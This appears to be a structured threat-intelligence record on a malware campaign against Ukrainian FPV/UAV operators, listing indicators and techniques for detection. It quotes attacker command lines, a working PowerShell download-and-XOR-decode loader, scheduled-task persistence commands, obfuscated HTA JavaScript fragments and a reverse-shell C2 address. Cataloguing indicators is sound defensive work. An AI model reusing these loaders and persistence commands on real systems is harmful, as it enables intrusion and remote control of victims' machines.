title: UAC-0244 / UAC-0247 Ukraine-Targeted Malware Campaign via LNK and HTA Droppers
description: A threat campaign targeting FPV/UAV operators uses LNK files pointing
  to mshta.exe to deliver an HTA/JavaScript loader that downloads and executes an
  XOR-decoded payload, injects shellcode into RuntimeBroker.exe, and establishes persistence
  via scheduled task. The final payload is an encrypted reverse shell connecting to
  a C2 over TCP 8443.
attribution: UAC-0244 / UAC-0247
malware_families:
- updater.exe
- EncryptedReverseShell
cves: []
ttps:
  processes:
  - mshta.exe
  - cmd.exe
  - curl.exe
  - powershell.exe
  - schtasks.exe
  - RuntimeBroker.exe
  - updater.exe
  command_lines:
  - cmd /c curl https://ukrvarta[.]online/dopomoga/updater.txt -o %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
  - cmd /c schtasks /create /tn "OneDriveUpdater" /tr "%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe"
    /sc MINUTE /mo 10 /ru "%USERNAME%" /f
  - cmd /c schtasks /create /tn "OneDrive Updater" /tr "%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe"
    /sc MINUTE /mo 10 /ru "%USERNAME%"
  - powershell -ep bypass -NoProfile -WindowStyle Hidden -e ""
  - cmd /C %s
  - powershell -ep bypass -NoProfile -WindowStyle Hidden -e "<base64>"
  - schtasks /create /tn "OneDrive Updater" /tr "%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe"
    /sc MINUTE /mo 10 /ru "%USERNAME%"
  - mshta.exe https://ukrvarta[.]online/dopomoga/dopomoga.hta
  powershell:
  - "$url = \"https://ukrvarta[.]online/conference/updater.txt\"\n$outPath = \"$env:LOCALAPPDATA\\\
    \\OneDriveUpdater\\\\OneDriveUpdater.exe\"\n$key = [byte[]](0x66,0x75,0x63,0x6b)\n\
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)\n$out = New-Object\
    \ byte[] $bytes.Length\nfor ($i = 0; $i -lt $bytes.Length; $i++) {\n    $out[$i]\
    \ = $bytes[$i] -bxor $key[$i % $key.Length]\n}\nNew-Item -ItemType Directory -Force\
    \ -Path (Split-Path $outPath) | Out-Null\n[IO.File]::WriteAllBytes($outPath, $out)"
  - 
  scripts:
  - dopomoga.hta
  - dopomoga.hta.old
  - script.js
  - conference.hta
  - conference2026_webdavroot.html
  - dopomoga.html
  - UESDBBQAAAGIAGh8ZVxSDhImkgIAAJSEAABMABWAGKTQVtGAOLZQsCDQtICwWRY/QstC60LggeL3QsCDQsIGDOLzQSNCIRZbRGCWOY29
  - var shell = new ActiveXObject(_0x983f2c(0x1ac)), fso = new ActiveXObject('Scripting.FileSystemObject'),
    dir = shell[_0x983f2c(0x1a9)](_0x983f2c(0x1a2)); if(fso[_0x983f2c(0x1b0)](dir)
    && fso[_0x983f2c(0x1a8)](dir));
  - shell[_0x983f2c(0x1b2)](_0x983f2c(0x1a3) + ps + "\x22", 0x0, !![]), shell[_0x983f2c(0x1b2)](_0x983f2c(0x1af),
    0x0, !![]);
  registry_keys: []
  image_loads:
  - ntdll.dll
  network_connections:
  - curl.exe -> ukrvarta[.]online:443
  - powershell.exe -> ukrvarta[.]online:443
  - browser -> ukrvarta[.]online:8080
  - EncryptedReverseShell.exe -> 109.237.97[.]4:8443
  - mshta.exe -> ukrvarta[.]online:8080
  - OneDriveUpdater.exe -> ukrvarta[.]online:443
  - browser -> ukrvarta[.]online:80
  file_activity:
  - '%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe'
  - '%LOCALAPPDATA%\OneDriveUpdater'
  - C:\Users\user\source\repos\EncryptedReverseShell\x64\Release\EncryptedReverseShell.pdb
  - '%LOCALAPPDATA%\OneDrive'
  persistence:
  - Scheduled task named "OneDriveUpdater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
    every 10 minutes in user context
  - Scheduled task named "OneDrive Updater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
    every 10 minutes in user context
  - Scheduled task named "OneDriveUpdater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
    every 10 minutes
  - Scheduled task named "OneDrive Updater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
    every 10 minutes
  - Scheduled task named "OneDrive Updater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
    every 10 minutes as %USERNAME%
  - Scheduled task creation via cmd with name "OneDrive" pointing to an updater binary
    in %LOCALAPPDATA%\OneDrive
  process_relations:
  - mshta.exe -> cmd.exe
  - cmd.exe -> curl.exe
  - cmd.exe -> schtasks.exe
  - mshta.exe -> script.js (HTA/JavaScript staging)
  - updater.exe -> RuntimeBroker.exe (process injection via NtCreateThreadEx)
  - mshta.exe -> powershell.exe
  - OneDriveUpdater.exe -> RuntimeBroker.exe
